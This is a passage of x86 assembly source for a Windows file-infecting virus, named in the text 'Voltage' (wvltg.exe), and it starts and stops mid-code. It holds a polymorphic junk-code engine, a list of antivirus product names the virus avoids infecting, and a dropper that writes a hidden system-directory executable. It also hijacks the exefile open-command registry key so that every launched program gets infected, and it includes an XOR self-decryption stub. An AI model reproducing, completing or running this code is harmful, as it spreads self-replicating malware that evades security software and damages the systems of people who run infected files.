	mov	ax,0b0fh
	stosw
	jmp	ExitGF
_F_2:	call	GenRandomNumber
	and	eax,384h
	cmp	eax,12ch
	ja	_ecx0_1
	mov	al,0b9h
	stosb
	xor	eax,eax
	stosd
	jmp	div_ecx
_ecx0_1:cmp	eax,258h
	ja	_ecx0_2
	mov	ax,0c92bh
	stosw
	jmp	div_ecx
_ecx0_2:mov	ax,0c933h
	stosw
div_ecx:call	WriteJunkCode
	mov	ax,0f1f7h
	stosw
ExitGF:	ret

	;instructions to generate in the stack:
	push_and_ret	db	68h,0,0,0,0,0c3h

	
_WriteJunkCode:		;gen junk code that dont destroy registers
	call	GenRandomNumber
	and	eax,5208h
	cmp	eax,0bb8h
	ja	_WJC1
	call	GenAndReg
	jmp	ExitJC
_WJC1:	cmp	eax,1770h
	ja	_WJC2
	call	GenJump
	jmp	ExitJC
_WJC2:	cmp	eax,2328h
	ja	_WJC3
	call	GenPushPop
	jmp	ExitJC
_WJC3:	cmp	eax,2ee0h
	ja	_WJC4
	call	GenIncDec
	jmp	ExitJC
_WJC4:	cmp	eax,3a98h
	ja	_WJC5
	call	GenMoveRegReg
	jmp	ExitJC
_WJC5:	call	OneByte
ExitJC:	ret

;output cl:reg id
GenMovRegEsp:
	call	GenRandomNumber
	and	eax,00000600h
	mov	ecx,8h
	mul	ecx
	mov	cl,ah
	add	ah,0cch
	mov	al,8bh
	stosw
	ret	

;output ch:reg id
GenEmptyReg:
	call	GenRandomNumber
	xor	ecx,ecx
	and	eax,5208h	
	cmp	eax,0bb8h
	ja	_ER
	mov	ch,0c0h
	jmp	_ER_
_ER:	cmp	eax,1770h
	ja	_ER2
	mov	ch,0dbh
	jmp	_ER_
_ER2:	cmp	eax,2328h
	ja	_ER3
	mov	ch,0c9h
	jmp	_ER_
_ER3:	cmp	eax,2ee0h
	ja	_ER4
	mov	ch,0d2h
	jmp	_ER_
_ER4:	cmp	eax,3a98h
	ja	_ER5
	mov	ch,0ffh
	jmp	_ER_
_ER5:	mov	ch,0f6h
_ER_:	call	GenRandomNumber
	cmp	ah,80h
	ja	_ER__
	mov	cl,33h
	jmp	_E_R
_ER__:	mov	cl,2bh
_E_R:	mov	ax,cx
	stosw	
	ret
	

GenMoveAndPush:
	push	eax				;number to mov & push
No_Esp:	call	GenRandomNumber
	and	al,7h
	mov	cl,al
	add	al,0b8h
	cmp	al,0bch
	je	No_Esp
	stosb
	pop	eax
	stosd
	push	ecx
	call	_WriteJunkCode			;gen junk between the mov and the push
	pop	eax
	add	al,50h
	stosb
	ret
		
InitRandomNumber:
	call	[ebp + GetTickCount]
	mov	dword ptr [ebp + RandomNumber],eax
	ret
	RandomNumber	dd	0
GenRandomNumber:				;a simple random num generator
	pushad
	mov	eax,dword ptr [ebp + RandomNumber]
	and	eax,12345678h
	mov	cl,ah
	ror	eax,cl
	add	eax,98765abdh
	mov	ecx,12345678h
	mul	ecx
	add	eax,edx
	xchg	ah,al
	sub	eax,edx
	mov	dword ptr [ebp + RandomNumber],eax
	popad
	mov	eax,dword ptr [ebp + RandomNumber]
	ret

WriteJunkCode:
	call	GenRandomNumber			;split this procedure
	and	eax,3e8h			;to four procedure's
	cmp	eax,0fah			;in order to give each
	ja	_jnk1				;junkcode the same chance
	call	WriteJunkCode1
	jmp	ExitJunk
_jnk1:	cmp	eax,1f4h
	ja	_jnk2
	call	WriteJunkCode2
	jmp	ExitJunk
_jnk2:	cmp	eax,2eeh
	ja	_jnk3
	call	WriteJunkCode3
	jmp	ExitJunk
_jnk3:	call	WriteJunkCode4
ExitJunk:ret




WriteJunkCode1:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jnk_1
	call	GenAndReg	;1
	jmp	ExtJunk1
_jnk_1:	cmp	eax,1f4h
	ja	_jnk_2
	call	GenJump		;2
	jmp	ExtJunk1
_jnk_2:	cmp	eax,2eeh
	ja	_jnk_3
	call	GenPushPop	;3
	jmp	ExtJunk1
_jnk_3:	call	GenIncDec	;4
ExtJunk1:ret
	
	
WriteJunkCode2:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jn_k1
	call	GenMoveRegReg	;5
	jmp	ExtJunk2
_jn_k1:	cmp	eax,1f4h
	ja	_jn_k2
	call	GenAnd		;6
	jmp	ExtJunk2
_jn_k2:	cmp	eax,2eeh
	ja	_jn_k3
	call	GenMove		;7
	jmp	ExtJunk2
_jn_k3:	call	GenPushTrashPopReg	;8
ExtJunk2:ret
	
	
WriteJunkCode3:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_j_nk1
	call	GenShrReg	;9
	jmp	ExtJunk3
_j_nk1:	cmp	eax,1f4h
	ja	_j_nk2
	call	GenShlReg	;10
	jmp	ExtJunk3
_j_nk2:	cmp	eax,2eeh
	ja	_j_nk3
	call	GenRorReg	;11
	jmp	ExtJunk3
_j_nk3:	call	GenRolReg	;12
ExtJunk3:ret
	
	
WriteJunkCode4:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	__jnk1
	call	GenOrReg	;13
	jmp	ExtJunk4
__jnk1:	cmp	eax,1f4h
	ja	__jnk2
	call	GenXorReg	;14
	jmp	ExtJunk4
__jnk2:	cmp	eax,2eeh
	ja	__jnk3
	call	GenSubAddTrash	;15
	jmp	ExtJunk4
__jnk3:	call	OneByte		;16
ExtJunk4:ret




GenAndReg:
	;this function generate and reg,reg instruction
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	and2
	mov	ah,0c0h
	jmp	exitand
and2:	cmp	eax,7d0h
	ja	and3
	mov	ah,0dbh
	jmp	exitand
and3:	cmp	eax,0bb8h
	ja	and4
	mov	ah,0c9h
	jmp	exitand
and4:	cmp	eax,0fa0h
	ja	and5
	mov	ah,0d2h
	jmp	exitand
and5:	cmp	eax,1388
	ja	and6
	mov	ah,0ffh
	jmp	exitand
and6:	cmp	eax,1770h
	ja	and7
	mov	ah,0f6h
	jmp	exitand
and7:	cmp	eax,1b58h
	ja	and8
	mov	ah,0edh
	jmp	exitand
and8:	mov	ah,0e4h
exitand:mov	al,23h
	stosw
	ret

GenJump:
	;this function generate do nothing condition jump
	call	GenRandomNumber
	and	eax,0fh
	add	eax,70h
	stosw
	ret

GenPushPop:
	;this function generate push reg \ pop reg instruction
	call	GenRandomNumber
	and	eax,7h
	add	eax,50h
	stosb
	add	eax,8h
	stosb
	ret

GenIncDec:
	;this function generate:inc reg\dec reg or dec reg\inc reg instruction
	call	GenRandomNumber
	cmp	al,7fh
	ja	decinc
	and	eax,7h
	add	eax,40h
	stosb
	add	eax,8h
	stosb
	jmp	exitincd
decinc:	and	eax,7h
	add	eax,48h
	mov	byte ptr [edi],al
	stosb
	sub	eax,8h
	mov	byte ptr [edi],al
	stosb
exitincd:ret


GenMoveRegReg:			;gen mov reg,reg
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	mreg2
	mov	ah,0c0h
	jmp	exitmreg
mreg2:	cmp	eax,7d0h
	ja	mreg3
	mov	ah,0dbh
	jmp	exitmreg
mreg3:	cmp	eax,0bb8h
	ja	mreg4
	mov	ah,0c9h
	jmp	exitmreg
mreg4:	cmp	eax,0fa0h
	ja	mreg5
	mov	ah,0d2h
	jmp	exitmreg
mreg5:	cmp	eax,1388
	ja	mreg6
	mov	ah,0ffh
	jmp	exitmreg
mreg6:	cmp	eax,1770h
	ja	mreg7
	mov	ah,0f6h
	jmp	exitmreg
mreg7:	cmp	eax,1b58h
	ja	mreg8
	mov	ah,0edh
	jmp	exitmreg
mreg8:	mov	ah,0e4h
exitmreg:
	mov	al,8bh
	stosw
	ret
	
GenAnd:
	;this function generate and ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nand1
	mov	ah,0e3h
	jmp	wand
nand1:	cmp	al,0a0h
	ja	nand2
	mov	ah,0e2h
	jmp	wand
nand2:	mov	ah,0e5h
wand:	mov	al,81h
	stosw
	pop	eax
	stosd
	ret
	
GenMove:
	;this function generate mov ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nmov1
	mov	al,0bbh
	jmp	wmov
nmov1:	cmp	al,0a0h
	ja	nmov2
	mov	al,0bah
	jmp	wmov
nmov2:	mov	al,0bdh
wmov:	stosb
	pop	eax
	stosd
	ret

GenPushTrashPopReg:
	;this function generate push trash\ pop ebp\ebx\edx instruction
	call	GenRandomNumber
	mov	byte ptr [edi],68h
	inc	edi
	stosd
	cmp	al,55h
	ja	nextpt
	mov	byte ptr [edi],5dh
	jmp	wpop
nextpt:	cmp	al,0aah
	ja	nextpt2
	mov	byte ptr [edi],5ah
	jmp	wpop
nextpt2:mov	byte ptr [edi],5bh
wpop:	inc	edi
	ret	
	
GenShrReg:				;gen shr unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshr
	mov	byte ptr [edi],0edh
	jmp	wshr
nshr:	cmp	al,0a0h
	ja	nshr2
	mov	byte ptr [edi],0eah
	jmp	wshr
nshr2:	mov	byte ptr [edi],0ebh
wshr:	inc	edi
	stosb
	ret
	
GenShlReg:				;gen shl unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshl
	mov	byte ptr [edi],0e3h
	jmp	wshl
nshl:	cmp	al,0a0h
	ja	nshl2
	mov	byte ptr [edi],0e2h
	jmp	wshl
nshl2:	mov	byte ptr [edi],0e5h
wshl:	inc	edi
	stosb
	ret
	
GenRorReg:				;gen ror unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nror
	mov	byte ptr [edi],0cbh
	jmp	wror
nror:	cmp	al,0a0h
	ja	nror2
	mov	byte ptr [edi],0cah
	jmp	wror
nror2:	mov	byte ptr [edi],0cdh
wror:	inc	edi
	stosb
	ret
	
	
GenRolReg:				;gen rol unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nrol
	mov	byte ptr [edi],0c3h
	jmp	wrol
nrol:	cmp	al,0a0h
	ja	nrol2
	mov	byte ptr [edi],0c2h
	jmp	wrol
nrol2:	mov	byte ptr [edi],0c5h
wrol:	inc	edi
	stosb
	ret
	
GenOrReg:				;gen or unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nor
	mov	ah,0cbh
	jmp	wor
nor:	cmp	ah,0a0h
	ja	nor2
	mov	ah,0cah
	jmp	wor
nor2:	mov	ah,0cdh
wor:	stosw
	pop	eax
	stosd
	ret

GenXorReg:				;gen xor unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nXor
	mov	ah,0f3h
	jmp	wXor
nXor:	cmp	ah,0a0h
	ja	nXor2
	mov	ah,0f2h
	jmp	wXor
nXor2:	mov	ah,0f5h
wXor:	stosw
	pop	eax
	stosd
	ret


GenSubAddTrash:				;gen add reg,num\sub reg,num
noesp:	call	GenRandomNumber
	mov	ebx,eax
	cmp	al,80h
	ja	sub_f
	and	ah,7h
	add	ah,0c0h
	cmp	ah,0c4h
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0e8h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	jmp	exitsa
sub_f:	and	ah,7h
	add	ah,0e8h
	cmp	ah,0ech
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0c0h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
exitsa:	ret

OneByte:				;gen one byte do nothing instruction
	call	GenRandomNumber
	cmp	al,32h
	ja	byte1
	mov	al,90h
	jmp	end_get_byte
byte1:	cmp	al,64h
	ja	byte2
	mov	al,0f8h
	jmp	end_get_byte
byte2:	cmp	al,96h
	ja	byte3
	mov	al,0f5h
	jmp	end_get_byte
byte3:	cmp	al,0c8h
	ja	byte4
	mov	al,0f9h
	jmp	end_get_byte
byte4:	mov	al,0fch
end_get_byte:
	stosb
	ret




	
;check if file is related to av programs or canot be infected
;input:
;esi - file name
;output:
;carry flag

CheckFileName:
	lea	esi,[ebp + FileToInfect]
	xor	ecx,ecx
@checkV:cmp	byte ptr [esi + ecx],'v'
	je	badfile
	cmp	byte ptr [esi + ecx],'V'
	je	badfile
	cmp	byte ptr [esi + ecx],0h
	je	no_v
	inc	ecx
	jmp	@checkV
no_v:	push	esi			;save file name for later use
	mov	ecx,TwoBytesNames	;scan for 2 bytes bad name
	lea	edi,[ebp + DontInfectTable]
l2:	mov	bx,word ptr [edi]
l2_1:	mov	ax,word ptr [esi]
	cmp	ax,bx
	je	ex_rs
	add	bx,2020h
	cmp	ax,bx
	je	ex_rs
	sub	bx,2020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l2_1
	mov	esi,[esp]		;restore file name	
	add	edi,2h
	loop	l2
	mov	ecx,FourBytesNames	;scan for 4 bytes bad name
	lea	edi,[ebp + DontInfectTable + (2*TwoBytesNames)]
	mov	esi,[esp]		;get file name
l3:	mov	ebx,dword ptr [edi]
l3_1:	mov	eax,dword ptr [esi]
	cmp	eax,ebx
	je	ex_rs
	add	ebx,20202020h
	cmp	eax,ebx
	je	ex_rs
	sub	ebx,20202020h
	inc	esi
	cmp	byte ptr [esi],0h
	jne	l3_1
	mov	esi,[esp]
	add	edi,4h
	loop	l3
	pop	esi
	stc
	ret
ex_rs:	pop	esi
badfile:clc
	ret
	
DontInfectTable:

	db	"FP"
	db	"TB"
	db	"AW"
	db	"DR"
	db	"F-"
	TwoBytesNames	equ	5
	db	"INOC"
	db	"PAND"
	db	"ANTI"
	db	"AMON"
	db	"N32S"
	db	"NOD3"
	db	"NPSS"
	db	"SMSS"
	db	"SCAN"
	db	"ZONE"
	db	"PROT"
	db	"MONI"
	db	"RWEB"
	db	"MIRC"
	db	"CKDO"
	db	"TROJ"
	db	"SAFE"
	db	"JEDI"
	db	"TRAY"		
	db	"ANDA"	
	db	"SPID"		
	db	"PLOR"
	db	"NDLL"		
	db	"TREN"
	db	"NSPL"
	db	"NSCH"
	db	"ALER"
	
	FourBytesNames	equ	27
	
InstallVirus:
	push	0ffh
	lea	eax,[ebp + VirusFile]
	push	eax
	push	0
	call	[ebp + GetModuleFileName]	;get infected file name
	push	0ffh
	lea	eax,[ebp + Buffer]
	push	eax
	call	[ebp + GetSystemDirectory]	;get windows directory
	cmp	eax,0h
	je	ExitInstall
	lea	eax,[ebp + ExeHookerName]
	push	eax
	lea	eax,[ebp + Buffer]
	push	eax
	call	[ebp + lstrcat]
	cmp	eax,0h
	je	ExitInstall
	call	CreateVirusFile			;create a exe that has only virus insaid
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
	lea	eax,[ebp + Buffer]
	push	eax
	call	[ebp + SetFileAttributes]	;hide the virus exe file hooker
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_WRITE
	push	0
	lea	eax,[ebp + ExeHookKey]
	push	eax
	push	HKEY_CLASSES_ROOT
	call	[ebp + RegOpenKeyEx]
	cmp	eax,0h
	jne	ExitInstall
	lea	eax,[ebp + Buffer]
	push	eax
	lea	eax,[ebp + ExeHookerValue]
	push	eax
	call	[ebp + lstrcat]
	cmp	eax,0h
	je	closkey
	lea	eax,[ebp + ExeHookerEndOfValue]
	push	eax
	lea	eax,[ebp + ExeHookerValue]
	push	eax
	call	[ebp + lstrcat]
	cmp	eax,0h
	je	closkey
	xor	ecx,ecx
	lea	eax,[ebp + ExeHookerValue]
	dec	eax
@counts:inc	eax
	inc	ecx
	cmp	byte ptr [eax],0h
	jne	@counts
	push	ecx
	lea	eax,[ebp + ExeHookerValue]
	push	eax
	push	REG_SZ
	xor	eax,eax
	push	eax
	push	eax
	push	dword ptr [ebp + hkey]	;set virus hook at registry
	call	[ebp + RegSetValueEx]	;now every exe file that execute will get infected	
closkey:push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
ExitInstall:
	ret
	
	VirusFile	db	0ffh	dup(0)
	Buffer		db	0ffh	dup(0)
	ExeHookerName	db	"\wvltg.exe",0
	ExeHookKey	db	"exefile\shell\open\command",0
	ExeHookerValue	db	'"',0ffh dup(0)
	ExeHookerEndOfValue	db	'" "%1" %*',0
	
	GPTR		equ	0040h
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	FILE_ATTRIBUTE_READONLY	equ	00000001h
	FILE_ATTRIBUTE_HIDDEN	equ	00000002h
	FILE_ATTRIBUTE_SYSTEM	equ	00000004h
	FILE_MAP_READ	equ	00000004h
	OPEN_EXISTING	equ	3
	OPEN_ALWAYS	equ	4
	FILE_SHARE_READ	equ	00000001h
	GENERIC_READ	equ	80000000h
	PAGE_READONLY	equ	00000002h
	HKEY_CLASSES_ROOT	equ	80000000h
	HKEY_CURRENT_USER	equ	80000001h
	REG_SZ			equ	1h
	KEY_WRITE		equ	00020006h
	KEY_READ		equ	00020019h
	KEY_QUERY_VALUE		equ	0001h
	ERROR_SUCCESS	equ	0h
	hkey		dd	0
	FILE_CURRENT	equ	1



CreateVirusFile:
;create pe file that contain the pure virus code
;in the system directory under the name wvltg.exe
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
	push	OPEN_ALWAYS
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + Buffer]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	CVF_Fail
	mov	[ebp + hvdfile],eax
	;write virus headers
	push	0h
	lea	eax,[ebp + written_bytes]
	push	eax
	push	SizeOfHeaders
	lea	eax,[ebp + VirusHeaders]
	push	eax
	push	[ebp + hvdfile]
	call	[ebp + WriteFile]
	;set file pointer to offset 600h
	push	FILE_BEGIN
	push	0h
	push	600h
	push	[ebp + hvdfile]
	call	[ebp + SetFilePointer]
	;write the virus code there
	push	0h
	lea	eax,[ebp + written_bytes]
	push	eax
	push	VirusSize
	lea	eax,[ebp + _main]
	push	eax
	push	[ebp + hvdfile]
	call	[ebp + WriteFile]
	;set file pointer to after (virus code + pad 200h)
	push	FILE_BEGIN
	push	0h
	push	ImportSectionInFile
	push	[ebp + hvdfile]
	call	[ebp + SetFilePointer]
	;write import section:
	push	0h
	lea	eax,[ebp + written_bytes]
	push	eax
	push	SizeOfImportSection
	lea	eax,[ebp + ImportSection]
	push	eax
	push	[ebp + hvdfile]
	call	[ebp + WriteFile]
	;align file size
	push	0h
	push	[ebp + hvdfile]
	call	[ebp + GetFileSize]
	push	eax
	xor	edx,edx
	mov	ecx,1000h		;file alignment
	div	ecx
	cmp	edx,0h
	je	no_pad
	sub	ecx,edx
	xchg	ecx,edx
no_pad1:pop	eax
	add	eax,edx
	push	FILE_BEGIN
	push	0h
	push	eax
	push	[ebp + hvdfile]
	call	[ebp + SetFilePointer]
	push	[ebp + hvdfile]
	call	[ebp + SetEndOfFile]
	push	[ebp + hvdfile]
	call	[ebp + CloseHandle]
CVF_Fail:
	ret




	written_bytes	dd	0
	hvdfile		dd	0	;virus dropper file handle


	IMAGE_DATA_DIRECTORY    STRUC
	    DD_VirtualAddress   DD    BYTE PTR ?
	    DD_Size             DD    ?
	IMAGE_DATA_DIRECTORY    ENDS


VirusHeaders:

	;mz header & dos stub program

	db    04Dh,05Ah,090h,000h,003h,000h,000h,000h,004h,000h,000h,000h,0FFh,0FFh,000h,000h 
	db    0B8h,000h,000h,000h,000h,000h,000h,000h,040h,000h,000h,000h,000h,000h,000h,000h 
	db    000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h 
	db    000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,080h,000h,000h,000h 
	db    00Eh,01Fh,0BAh,00Eh,000h,0B4h,009h,0CDh,021h,0B8h,001h,04Ch,0CDh,021h,054h,068h 
	db    069h,073h,020h,070h,072h,06Fh,067h,072h,061h,06Dh,020h,063h,061h,06Eh,06Eh,06Fh 
	db    074h,020h,062h,065h,020h,072h,075h,06Eh,020h,069h,06Eh,020h,044h,04Fh,053h,020h
	db    06Dh,06Fh,064h,065h,02Eh,00Dh,00Dh,00Ah,024h,000h,000h,000h,000h,000h,000h,000h 
	


	;pe header:
	
		PE_Magic			DD	00004550h
		Machine				DW 	014ch
		NumberOfSections		DW 	2h
		TimeDateStamp			DD 	3878561Ah
		PointerToSymbolTable		DD 	0
		NumberOfSymbols			DD 	0
		SizeOfOptionalHeader		DW 	SizeOfPeOptionalHeader
		Characteristics			DW 	30Eh

Pe_OptionalHeader:
	;pe optional header:
	
		OH_Magic                        DW 	010Bh
		OH_MajorLinkerVersion           DB 	05h
		OH_MinorLinkerVersion           DB 	0
		OH_SizeOfCode                   DD 	0
		OH_SizeOfInitializedData        DD 	(SizeOfImportSection+(200h-(SizeOfImportSection mod 200h)))
		OH_SizeOfUninitializedData      DD 	0
		OH_AddressOfEntryPoint          DD 	(1000h+Wvltg_EntryPoint-_main)	;entry point!
		OH_BaseOfCode                   DD 	1000h		;code placed at 1000h
		OH_BaseOfData                   DD 	(1000h+VirusSize+(1000h-(VirusSize mod 1000h)))	;placed after code in the memory
		OH_ImageBase                    DD 	400000h
		OH_SectionAlignment             DD 	1000h
		OH_FileAlignment                DD 	200h
		OH_MajorOperatingSystemVersion  DW 	0004h
		OH_MinorOperatingSystemVersion  DW 	0
		OH_MajorImageVersion            DW 	0
		OH_MinorImageVersion            DW 	0
		OH_MajorSubsystemVersion        DW 	0004h
		OH_MinorSubsystemVersion        DW 	0
		OH_Win32VersionValue            DD 	0		;reserved1
		OH_SizeOfImage                  DD 	8000h
		OH_SizeOfHeaders                DD 	SizeOfHeaders
		OH_CheckSum                     DD 	0
		OH_Subsystem                    DW 	0002h
		OH_DllCharacteristics           DW 	0
		OH_SizeOfStackReserve           DD  	00100000h
		OH_SizeOfStackCommit            DD  	00002000h
		OH_SizeOfHeapReserve            DD 	00100000h
		OH_SizeOfHeapCommit             DD 	00001000h
		OH_LoaderFlags                  DD  	0
		OH_NumberOfRvaAndSizes          DD  	00000010h


	;pe data directory
	
		DE_Export 	 	IMAGE_DATA_DIRECTORY 	?

		;DE_Import:		
		DD_VirtualAddress_   DD    ImportSectionInTheMemory
		DD_Size_             DD    SizeOfImportSection
			
		DE_Resource 	 	IMAGE_DATA_DIRECTORY   	?
		DE_Exception 	 	IMAGE_DATA_DIRECTORY  	?
		DE_Security 	 	IMAGE_DATA_DIRECTORY 	?
		DE_BaseReloc 	 	IMAGE_DATA_DIRECTORY 	?
		DE_Debug 	 	IMAGE_DATA_DIRECTORY 	?
		DE_Copyright 	 	IMAGE_DATA_DIRECTORY 	?
		DE_GlobalPtr 	 	IMAGE_DATA_DIRECTORY 	?
		DE_TLS 	 	 	IMAGE_DATA_DIRECTORY 	?
		DE_LoadConfig 	 	IMAGE_DATA_DIRECTORY 	?
		DE_BoundImport 	 	IMAGE_DATA_DIRECTORY 	?
		DE_IAT 	 	 	IMAGE_DATA_DIRECTORY 	?
		DE_Reserved1 	 	IMAGE_DATA_DIRECTORY 	?
		DE_Reserved2 	 	IMAGE_DATA_DIRECTORY 	?
		DE_Reserved3 	 	IMAGE_DATA_DIRECTORY 	?

		
		SizeOfPeOptionalHeader	=	($-Pe_OptionalHeader)
		

		;wvltg's code section
		
		SH_Name 	 	 	DB	".Voltage"
		SH_VirtualSize 	 	 	DD  	VirusSize
		SH_VirtualAddress 	 	DD  	1000h
		SH_SizeOfRawData 	 	DD  	(VirusSize+(200h-(VirusSize mod 200h)))
		SH_PointerToRawData 	 	DD  	600h
		SH_PointerToRelocations 	DD  	0
		SH_PointerToLinenumbers 	DD 	0
		SH_NumberOfRelocations 	 	DW  	0
		SH_NumberOfLinenumbers 	 	DW  	0
		SH_Characteristics 	 	DD  	0C0000000h

		;wvltg's import section		
		
		SH_Name__ 	 	 	DB	"(c)DR-EF"
		SH_VirtualSize__ 	 	DD  	SizeOfImportSection
		SH_VirtualAddress__ 	 	DD  	ImportSectionInTheMemory
		SH_SizeOfRawData__ 	 	DD  	(SizeOfImportSection+(200h-(SizeOfImportSection mod 200h)))
		SH_PointerToRawData__ 	 	DD  	ImportSectionInFile
		SH_PointerToRelocations__ 	DD  	0
		SH_PointerToLinenumbers__ 	DD 	0
		SH_NumberOfRelocations__ 	DW  	0
		SH_NumberOfLinenumbers__ 	DW  	0
		SH_Characteristics__ 	 	DD  	040000040h
		
		
		SizeOfHeaders	=	($-VirusHeaders)

		ImportSectionInFile		=	(600h+VirusSize+(200h-(VirusSize mod 200h)))
							
		ImportSectionInTheMemory	=	(1000h+VirusSize+(1000h-(VirusSize mod 1000h)))
							


ImportSection:
		;dummy import section


		ID_OriginalFirstThunk     DD    (ImportSectionInTheMemory+IMAGE_THUNK_DATA-ImportSection)		
		ID_TimeDateStamp          DD    0
		ID_ForwarderChain         DD    0
		ID_Name                   DD    (ImportSectionInTheMemory+DLL_NAME- ImportSection)		
		ID_FirstThunk             DD    (ImportSectionInTheMemory+IMAGE_THUNK_DATA- ImportSection)	

		dd           0,0,0,0,0			;empty IID=end of iid array

IMAGE_THUNK_DATA:
		TD_AddressOfData	DD   (ImportSectionInTheMemory+IMPORT_BY_NAME- ImportSection)			
		TD_Ordinal		DD    ?                 
		TD_Function		DD    ? 
		TD_ForwarderString	DD    0                   


		DLL_NAME		db	"KERNEL32.DLL",0

IMPORT_BY_NAME:
		IBN_Hint            DW    0
		IBN_Name            DB    "GetProcAddress",0  



		SizeOfImportSection	=	($-ImportSection)



ProcessCommandLine:
	pushad					;set SEH to avoid errors
	lea	ebx,[ebp + CMDProcess_Err]
	push	ebx
	xor	ebx,ebx
	push	dword ptr fs:[ebx]
	mov	fs:[ebx],esp
	lea	edi,[ebp + HookerInformation]
	xor	eax,eax
	mov	ecx,SizeOfHookerInformation
@Blank:	stosb					;blank some variable to avoid errors
	loop	@Blank				;in next generations				
	mov	byte ptr [ebp + RunFromExeHooker],0
	call	[ebp + GetCommandLine]
@l1:	inc	eax				;get file path
	cmp	byte ptr [eax],'"'
	jne	@l1
	cmp	byte ptr [eax + 2h],'"'
	jne	ExitProcessCMD
	add	eax,3h
	cmp	byte ptr [eax],0
	je	ExitProcessCMD
	xor	edx,edx
	lea	ebx,[ebp + FileToInfect]
@l2:	mov	cl,byte ptr [eax]
	cmp	cl,'"'
	je	CpyParm
	mov	byte ptr [ebx],cl
	inc	ebx
	inc	eax
	inc	edx
	jmp	@l2
CpyParm:cmp	byte ptr [eax + 3h],0		;check if there is command line parameter
	je	ExitCommandLineProc
	mov	ecx,edx				;copy the file path to the command line
	lea	esi,[ebp + FileToInfect]
	lea	edi,[ebp + CommandLine]
	rep	movsb
	lea	esi,[ebp + CommandLine]
	mov	byte ptr [esi+edx],20h		;add space
	lea	ebx,[ebp + CommandLine]
	add	ebx,edx
	inc	ebx
	add	eax,2h
@l3:	mov	cl,byte ptr [eax]
	cmp	cl,0
	je	ExitCommandLineProc
	mov	byte ptr [ebx],cl
	inc	eax
	inc	ebx
	jmp	@l3
ExitCommandLineProc:
	xor	ecx,ecx
	lea	eax,[ebp + FileToInfect]	;get file directory
@l4:	inc	eax				;goto end of file name
	inc	ecx				;get file path size
	cmp	byte ptr [eax],0
	jne	@l4
@l5:	dec	eax
	dec	ecx
	cmp	byte ptr [eax],'\'
	jne	@l5
	lea	edi,[ebp + FileDirectory]
	lea	esi,[ebp + FileToInfect]
	rep	movsb
	call	[ebp + GetCommandLine]		;check if we running
ishook:	mov	ecx,0ah				;from the exe file
	mov	edi,eax				;hooker file or just
	lea	esi,[ebp + ExeHookerName]	;from infected exe
	rep	cmpsb				;that executed with
	jne	nxt_c				;command line.
	inc	byte ptr [ebp + RunFromExeHooker]
	jmp	ExitProcessCMD
nxt_c:	inc	eax
	cmp	byte ptr [eax],0h
	jne	ishook
	ret
ExitProcessCMD:
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	ret
CMDProcess_Err:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]		;remove SEH
	add	esp,4h
	popad
	ret
	
	
	
	HookerInformation:
	
	RunFromExeHooker	db	0
	FileToInfect	db	0ffh	dup(0)
	CommandLine	db	0ffh	dup(0)
	FileDirectory	db	0ffh	dup(0)
	
	SizeOfHookerInformation	equ	($-HookerInformation)

get_apis:
;ecx - number of apis
;eax - address to api strings
;ebx - address to api address
;edx - module handle
NextAPI:
	push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	ApiErr
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	NextAPI
	stc
	ret
ApiErr:	add	esp,0ch
	clc
	ret


	EncryptedVirusEnd	equ	$
	
DecryptVirus:
	mov	esi,[esp]		;get return address
	mov	ecx,EncryptedVirus	;size of encrypted virus
	push	dword ptr fs:[0]
	mov	fs:[0],esp		;set SEH
decrypt:xor	byte ptr [esi],0h
	XorKey	equ	($-1)
	inc	esi
	loop	decrypt
	mov	[ecx],eax		;use SEH to jump back to virus


	db	30h	dup(?)		;padding
	VirusEnd	equ	$
	
	

FirstGenHost:
	mov	ebp,VirusSize
	xor	ebp,ebp						;first generation delta offset
	push	offset Exit		
